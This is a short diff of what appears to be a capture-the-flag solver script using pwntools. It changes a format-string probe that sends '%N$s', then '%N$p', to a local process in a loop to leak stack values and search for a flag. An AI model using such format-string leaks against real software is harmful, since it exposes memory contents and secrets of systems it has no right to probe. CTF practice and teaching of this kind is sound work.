@@ -10,7 +10,7 @@ for i in range(100):
         p = process(level='error')
         # When we see the user prompt '>', format the counter
         # e.g. %2$s will attempt to print second pointer as string
-        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
+        p.sendlineafter(b'> ', '%{}$p'.format(i).encode())
         # Receive the response
         result = p.recvuntil(b'> ')
         # Check for flag
